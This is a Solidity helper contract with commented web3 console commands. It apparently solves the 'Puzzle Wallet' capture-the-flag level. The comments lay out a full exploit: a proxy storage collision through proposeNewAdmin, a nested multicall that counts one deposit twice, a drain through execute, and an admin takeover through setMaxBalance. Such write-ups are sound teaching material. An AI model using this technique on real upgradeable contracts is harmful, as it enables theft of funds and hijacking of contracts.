// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "./hadcoins.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0/contracts/token/ERC20/IERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0/contracts/token/ERC20/ERC20.sol";

contract Test {
    bytes[3] abis1;
    bytes[6] abis2;
    bytes[2] multicalldata;
    bytes[1] secondCall;

    constructor() public {
        abis1[0] = abi.encodeWithSignature(
            "proposeNewAdmin(address)",
            0xB70B5095274a6255890624e026a9C0e5c950f7C3
        );
        abis1[1] = abi.encodeWithSignature("approveNewAdmin(address)");
        abis1[2] = abi.encodeWithSignature("upgradeTo(address)");

        abis2[0] = abi.encodeWithSignature("init(uint256)");
        abis2[1] = abi.encodeWithSignature("setMaxBalance(uint256)");
        abis2[2] = abi.encodeWithSignature("deposit()");
        abis2[3] = abi.encodeWithSignature("execute(address,uint256,bytes)");
        abis2[4] = abi.encodeWithSignature("setMaxBalance(uint256)");
        secondCall[0] = abis2[2];

        abis2[5] = abi.encodeWithSignature("multicall(bytes[])");

        multicalldata[0] = abis2[2];
        multicalldata[1] = abis2[5];
    }

    function getAbiOfProxy() public view returns (bytes[3] memory) {
        return abis1;
    }

    function getAbiOfContract() public view returns (bytes[6] memory) {
        return abis2;
    }

    function getSigForMultiCall() public view returns (bytes[2] memory) {
        return multicalldata;
    }
}
//await web3.eth.sendTransaction({from :"0xB70B5095274a6255890624e026a9C0e5c950f7C3", to:"0x8391e3e3eb49f9f9AA9Aad37e6D65885EE98d2D0", data:"0xa6376746000000000000000000000000b70b5095274a6255890624e026a9c0e5c950f7c3"})
//0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000
// data0 = "0xd0e30db0"
// data1 = web3.eth.abi.encodeFunctionSignature("multicall(bytes[])")
// data2 = web3.eth.abi.encodeParameter("bytes[]", data0)
// data3 = data1 + data2.substring(2)
// await contract.multicall([data0, data3], {value:"1000000000000000"})
// await contract.execute("0xB70B5095274a6255890624e026a9C0e5c950f7C3", 2000000000000000, "0x")
// await contract.setMaxBalance("0xB70B5095274a6255890624e026a9C0e5c950f7C3")
